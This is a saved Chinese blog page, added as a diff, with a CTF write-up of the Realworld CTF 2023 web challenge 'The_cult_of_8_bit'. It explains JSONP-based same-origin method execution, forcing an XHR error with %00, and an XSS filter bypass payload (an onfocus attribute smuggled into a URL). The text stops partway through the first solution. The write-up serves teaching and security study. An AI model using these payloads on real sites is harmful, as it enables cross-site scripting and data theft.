@@ -1,0 +1,990 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[原创] Realworld CTF 2023 The_cult_of_8_bit 详解 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Realworld CTF 2023 The cult of 8 bit 详解：JSONP callback SOME 攻击 + XHR %00 报错触发 fallback + iframe name 字符 focus 事件 + opener 跨域访问，逐字符泄漏 36 字符 UUID post id 后访问 &#x2F;post&#x2F;?id&#x3D; 取 flag。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[原创] Realworld CTF 2023 The_cult_of_8_bit 详解">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/%E5%8E%9F%E5%88%9B-Realworld_CTF_2023_The_cult_of_8_bit%E8%AF%A6%E8%A7%A3/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="Realworld CTF 2023 The cult of 8 bit 详解：JSONP callback SOME 攻击 + XHR %00 报错触发 fallback + iframe name 字符 focus 事件 + opener 跨域访问，逐字符泄漏 36 字符 UUID post id 后访问 &#x2F;post&#x2F;?id&#x3D; 取 flag。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="some_attack_jsonp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/%E5%8E%9F%E5%88%9B-Realworld_CTF_2023_The_cult_of_8_bit%E8%AF%A6%E8%A7%A3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[原创] Realworld CTF 2023 The_cult_of_8_bit 详解',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">[原创] Realworld CTF 2023 The_cult_of_8_bit 详解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="[原创] Realworld CTF 2023 The_cult_of_8_bit 详解"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/91479.html">https://www.ctfiot.com/91479.html</a><br>ID: 91479</p>
+</blockquote>
+<p>前言</p>
+<p>很难的题，</p>
+<p>这题要用到的一些知识点</p>
+<p>同源策略</p>
+<p>jsonp</p>
+<p>Same Orign Method Execution （同源方法执行）</p>
+<p>浏览器的opener 对象</p>
+<p>iframe</p>
+<p>XHR</p>
+<p>特征策略</p>
+<p>提前要了解的一些东西</p>
+<p>关于同源策略</p>
+<p>同源策略具体可以参见文档</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy</a></p>
+<p>这里主要介绍下 跨源脚本 API 访问</p>
+<p>Window</p>
+<p>允许以下对 Window 属性的跨源访问：</p>
+<p>方法</p>
+<p>window.blur</p>
+<p>window.close</p>
+<p>window.focus</p>
+<p>window.postMessage</p>
+<p>属性</p>
+<p>window.closed</p>
+<p>只读。</p>
+<p>window.frames</p>
+<p>只读。</p>
+<p>window.length</p>
+<p>只读。</p>
+<p>window.location</p>
+<p>读&#x2F;写。</p>
+<p>window.opener</p>
+<p>只读。</p>
+<p>window.parent</p>
+<p>只读。</p>
+<p>window.self</p>
+<p>只读。</p>
+<p>window.top</p>
+<p>只读。</p>
+<p>window.window</p>
+<p>只读。</p>
+<p>某些浏览器允许访问除上述外更多的属性。</p>
+<p>Location</p>
+<p>允许以下对 Location 属性的跨源访问：</p>
+<p>方法</p>
+<p>location.replace</p>
+<p>属性</p>
+<p>HTMLAnchorElement.href</p>
+<p>只写。</p>
+<p>某些浏览器允许访问除上述外更多的属性。</p>
+<p>window 对象表示的就是当前页面，字面意思，是 “根”</p>
+<p>可以发现 window 对象的 opener top location frames focus() 等关键属性和方法我们都是可以跨域访问的，这就为我们后面解题提供了依据。</p>
+<p>注意：像上面的那些属性和方法都是 window对象下的，意味着他们都是全局属性或全局方法，即可以类似这样直接访问，不需要使用 window. 来操作</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>&#x2F;&#x2F;将window.location赋值为<a target="_blank" rel="noopener" href="http://example.com,即重定向跳转到http//example.com">http://example.com，即重定向跳转到http://example.com</a></p>
+<p>location &#x3D; “<a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a>“;</p>
+<p>&#x2F;&#x2F;获取到当前页面中name为test的iframe对象</p>
+<p>let testIframe &#x3D; window[‘test’];</p>
+<p>&#x2F;&#x2F;或</p>
+<p>let testIframe &#x3D; window.frames[0];&#x2F;&#x2F;获取第0个iframe</p>
+<p>对于上面的 opener 属性也很有趣，它指向当前窗口的打开者。</p>
+<p>即 A 页面使用 open 方法打开了 B 页面，那么 B 页面的 opener 就指向了 A 页面的 window</p>
+<p>注意：opener指向的是页面窗口，也就是说你页面的URL再怎么变，opener是不变的</p>
+<p>同样，对于 opener 对象内容的访问也要遵循同源策略</p>
+<p>关于jsonp</p>
+<p>jsonp的出现是为了解决一些前端的跨域问题。现浏览器一般情况下都要遵循同源策略，所以跨域传输数据就会比较麻烦，所以出现了jsonp这种东西，相关文档参考 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/24390509">https://zhuanlan.zhihu.com/p/24390509</a></p>
+<p>简单来说下，就是像<script> 标签是支持跨域的，所以利用 <script> 标签来跨域获取到要执行的方法和参数，前端将获取到的方法和参数添加到 html 的 script 标签中从而解决跨域问题。而这里要说的题就是利用jsop跨域来进行 Same Orign Method Execution Attack （同源方法执行攻击）</p>
+<p>SOME（Same Orign Method Execution）同源方法执行</p>
+<p>这里大力推荐这篇论文，讲的非常详细</p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf">https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf</a></p>
+<p>这里大致说一下是怎么个回事</p>
+<p>比如我前端要跨域获取一些数据，于是我前端可以这样写</p>
+<p><a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a></p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<html>
+
+
+
+<p>[hack](javascript:<br>alert('hack'))</p>
+<script>
+
+function load_data(data) {
+
+console.log(data['data']);
+
+}
+
+let callback = new URLSearchParams(window.location.search).get('callback');
+
+let script = document.createElement("script");
+
+script.src = "http://otherSite.com/endpoint?callback=" + callback;
+
+document.head.appendChild(script);
+
+</script>
+
+
+
+</html>
+
+<p>我们访问 <a target="_blank" rel="noopener" href="http://example.com/?callback=load_data">http://example.com/?callback=load_data</a></p>
+<p>后端 <a target="_blank" rel="noopener" href="http://othersite.com/endpoint?callback=load_data">http://otherSite.com/endpoint?callback=load_data</a> 访问返回了这样的数据</p>
+<p>1</p>
+<p>load_data({"data":"data"})</p>
+<p>那么利用jsonp在 <a target="_blank" rel="noopener" href="http://example.com/">http://example.com/</a> 成功跨获取到了 <a target="_blank" rel="noopener" href="http://othersite.com/">http://otherSite.com/</a> 这个域的数据，并执行 load_data 方法在控制台打印出结果。但如果我们把 callback 的参数改成其他方法，不就可以在前端执行一些方法了吗，虽然一般返回的方法内有参数，但像类似 点击、表单提交、表单输入值篡改等JavaScript 函数，（例如 element.click()、privateForm.submit()、inputElement.stepUp/stepDown()、element.select()、element.focus ()、JsDefinedFunction()、jQueryFunc()等，这些方法给他参数他也能正常执行。</p>
+<p>像上面的例子，我们如果发送这样的url</p>
+<p><a target="_blank" rel="noopener" href="http://example.com/?callback=document.body.firstChild.click">http://example.com/?callback=document.body.firstChild.click</a></p>
+<p>那么就会发现成功点击了 <a> 标签从而弹窗 “hack”</p>
+<p>XHR</p>
+<p>用法不过多做介绍，这里附上参考文档</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest</a></p>
+<p>这里说一些比较少见东西，就是在什么情况下会其 open 方法会报错，发现主要有以下几种情况</p>
+<p>传递给第一个参数 (请求方法) 的值不是有效的 HTTP 方法（例如 “GET”, “POST” 等）。</p>
+<p>传递给第二个参数 (请求 URL) 的值不是有效的 URL。</p>
+<p>传递给第三个参数 (是否异步) 的值不是一个布尔值。</p>
+<p>使用了特征策略 sync-xhr 'none' 禁止了xhr api</p>
+<p>关于上面第二条不是有效的 URL 可能有以下几种情况：</p>
+<p>不符合 URL 格式，例如缺少协议部分 (http:// 或 https://) 或者域名部分。</p>
+<p>使用非法字符</p>
+<p>使用不正确的编码，例如使用百分号编码的字符不符合 UTF-8 格式。</p>
+<p>使用无效的端口号，例如端口号小于 0 或大于 65535。</p>
+<p>例：</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>// 使用非法字符如中间加入空格，%00等</p>
+<p>let xhr = new XMLHttpRequest();</p>
+<p>xhr.open("GET", "<a target="_blank" rel="noopener" href="https://www.ex/">https://www.ex</a> ample.com");</p>
+<p>xhr.send()//在send时报错</p>
+<p>// 使用不正确的编码</p>
+<p>let xhr = new XMLHttpRequest();</p>
+<p>xhr.open("GET", "<a target="_blank" rel="noopener" href="https://www.example.com/%00%22);//%E5%9C%A8open%E6%97%B6%E5%B0%B1%E4%BC%9A%E6%8A%A5%E9%94%99">https://www.example.com/%00&quot;);//在open时就会报错</a></p>
+<p>xhr.send()</p>
+<p>// 使用无效的端口号</p>
+<p>let xhr = new XMLHttpRequest();</p>
+<p>xhr.open("GET", "<a target="_blank" rel="noopener" href="https://www.example.com/">https://www.example.com</a>:<br>70000");//在open时就会报错</p>
+<p>xhr.send()</p>
+<p>iframe与特征策略</p>
+<p>iframe参考文档</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe</a></p>
+<p>有关iframe的一些黑魔法</p>
+<p><a target="_blank" rel="noopener" href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/">https://blog.huli.tw/2022/04/07/iframe-and-window-open/</a></p>
+<p>iframe 就是新开了一个页面，iframe的父子窗口之间使用js交互同样必须遵循 同源策略，若想跨域操作可以用 postMessage</p>
+<p>iframe有个 allow 属性，用于为指定其 特征策略 ，所以我们完全可以限制iframe页面的一些功能，像可以禁掉其中的一些api，比如 xhr。</p>
+<p>题目分析</p>
+<p>尝试csrf（失败的方案）</p>
+<p>好了，说了这么多终于要回到正题了。</p>
+<p>题目给了源码，是一个简单的 expressjs 笔记存储服务，源码很长，需要慢慢审。这里说下关键的地方</p>
+<p>首先xssbot是以admin登录后访问我们给的url，没啥好说的。</p>
+<p>后端有这么几个路由</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>app.get("/login/", mw.requiresNoLogin, (req, res) => res.render("login"));</p>
+<p>app.get("/register/", mw.requiresNoLogin, (req, res) => res.render("register"));</p>
+<p>app.get("/report/", mw.requiresLogin, (req, res) => res.render("report"));</p>
+<p>app.get("/post/", (req, res) => res.render("post"));</p>
+<p>app.get("/", (req, res) => res.render("home"));</p>
+<p>可以发现 / 和/post/ 者两个页面没有校验 csrftoken和登录情况。</p>
+<p>db.js 中</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>(() => {</p>
+<p>let flagId = crypto.randomUUID();</p>
+<p>console.log(<code>flag post ID: ${flagId}</code>);</p>
+<p>posts.set(flagId, {</p>
+<p>name: "Flag",</p>
+<p>body: process.env.FLAG || "flag{test_flag}"</p>
+<p>});</p>
+<p>users.set("admin", Object.freeze({</p>
+<p>user: "admin",</p>
+<p>pass: sha256(process.env.ADMIN_PASSWORD || "password"),</p>
+<p>posts: Object.freeze([flagId]),</p>
+<p>todos: Object.freeze([])</p>
+<p>}));</p>
+<p>flag对应着post id</p>
+<p>所以只要我们知道对应的post id就可以通过 /post/ 路由不用登录直接拿到flag。</p>
+<p>同时在 /create/post 路由中</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>23</p>
+<p>router.post("/create/todo", [mw.csrfProtection, mw.requiresLogin], (req, res) => {</p>
+<p>let { text } = req.body;</p>
+<p>if (!text) {</p>
+<p>return res.redirect("/?msg=Missing text");</p>
+<p>}</p>
+<p>if (typeof text !== "string") {</p>
+<p>return res.redirect("/?msg=Missing text");</p>
+<p>}</p>
+<p>let isURL = false;</p>
+<p>try {</p>
+<p>new URL(text); // errors if not valid URL</p>
+<p>isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no</p>
+<p>} catch {}</p>
+<p>req.user.todos.push({</p>
+<p>text, isURL</p>
+<p>});</p>
+<p>res.redirect("/");</p>
+<p>});</p>
+<p>可以看到对传来的text进行了过滤，拦截了以 javascript: 开头的 text</p>
+<p>这里对应前端 home.ejs</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p><%_ user.todos.forEach(todo => { _%></p>
+<p><%_ if (todo.isURL) { _%></p>
+<li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li>
+
+<p><%_ } else { _%></p>
+<li class="has-text-left"><%= todo.text %></li>
+
+<p><%_ } _%></p>
+<p><%_ }); _%></p>
+<p>这里的绕过也很容易，给出这样的payload即可绕过</p>
+<p>1</p>
+<p><a target="_blank" rel="noopener" href="http://a/">http://a</a>? onfocus=alert(123) id=x</p>
+<p>new URL("<a target="_blank" rel="noopener" href="http://a/">http://a</a>? onfocus=alert(123) id=x") 不会报错</p>
+<p>之后访问 <a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/#x 获取到id为x的焦点事件即可xss</p>
+<p>但是，注意，这个点在这题并用不上。</p>
+<p>首先题目使用了csrftoken，所以没法直接利用CSRF让xssbot向/api/create/todo 发送对应的xss payload来达到目的，其次还有重要的一点是这里</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>// Don't allow admin to make new posts / todos</p>
+<p>router.use((req, res, next) => {</p>
+<p>if (req.user.user === "admin")  {</p>
+<p>return res.redirect("/?msg=Nice try");</p>
+<p>}</p>
+<p>next();</p>
+<p>});</p>
+<p>直接限制死了admin不可能向 /api/create/post 和 /api/create/todo 发送数据。</p>
+<p>所以走csrf这条路是不行了。</p>
+<p>利用 SOEM ATTACK 窃取post id</p>
+<p>注意前端 post.ejs</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>window.onload = function() {</p>
+<p>const id = new URLSearchParams(window.location.search).get('id');</p>
+<p>if (!id) {</p>
+<p>return;</p>
+<p>}</p>
+<p>// Load post from POST_SERVER</p>
+<p>// Since POST_SERVER might be a different origin, this also supports loading data through JSONP</p>
+<p>const request = new XMLHttpRequest();</p>
+<p>try {</p>
+<p>request.open('GET', POST_SERVER + <code>/api/post/</code> + encodeURIComponent(id), false);</p>
+<p>request.send(null);</p>
+<p>}</p>
+<p>catch (err) { // POST_SERVER is on another origin, so let's use JSONP</p>
+<p>let script = document.createElement("script");</p>
+<p>script.src = <code>${POST_SERVER}/api/post/${id}?callback=load_post</code>;</p>
+<p>document.head.appendChild(script);</p>
+<p>return;</p>
+<p>}</p>
+<p>load_post(JSON.parse(request.responseText));</p>
+<p>}</p>
+<p>这里可以发现，如果 try 捕获到了异常，就会使用 jsonp 技术来获取post相关信息。</p>
+<p>后端处理</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>4</p>
+<p>5</p>
+<p>6</p>
+<p>7</p>
+<p>8</p>
+<p>9</p>
+<p>10</p>
+<p>11</p>
+<p>12</p>
+<p>13</p>
+<p>14</p>
+<p>15</p>
+<p>16</p>
+<p>17</p>
+<p>18</p>
+<p>19</p>
+<p>20</p>
+<p>21</p>
+<p>22</p>
+<p>23</p>
+<p>24</p>
+<p>router.get("/post/:id", (req, res) => {</p>
+<p>let { id } = req.params;</p>
+<p>if (!id || typeof id !== "string") {</p>
+<p>return res.jsonp({</p>
+<p>success: false,</p>
+<p>error: "Missing id"</p>
+<p>});</p>
+<p>}</p>
+<p>if (!db.posts.has(id)) {</p>
+<p>return res.jsonp({</p>
+<p>success: false,</p>
+<p>error: "No post found with that id"</p>
+<p>});</p>
+<p>}</p>
+<p>let post = db.posts.get(id);</p>
+<p>return res.jsonp({</p>
+<p>success: true,</p>
+<p>name: post.name,</p>
+<p>body: post.body</p>
+<p>});</p>
+<p>});</p>
+<p>但前端 post.ejs 中的 POST_SERVER 定死了，我们没法去修改它。</p>
+<p>所以可以考虑从查询参数 id 中入手，想办法让我们随心修改 callback 参数从而实现 SOME 攻击。</p>
+<p>这里解决的点有两个</p>
+<p>让 open 或 send 方法出错从而让我们可以使用jsonp</p>
+<p>要截获 url 查询参数中的 callback 参数</p>
+<p>解决这两个点有两种不同的方案</p>
+<p>方案一</p>
+<p>思路来自 <a target="_blank" rel="noopener" href="https://sh1yo.art/ctf/thecultof8bit/">https://sh1yo.art/ctf/thecultof8bit/</a></p>
+<p>上文说过，我们可以利用 %00 来让 open 方法报错</p>
+<p>像这样的链接</p>
+<p>1</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>:<br>12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00</p>
+<p>这个链接经过</p>
+<p>1</p>
+<p>const id = new URLSearchParams(window.location.search).get('id');</p>
+<p>提取得到</p>
+<p>1</p>
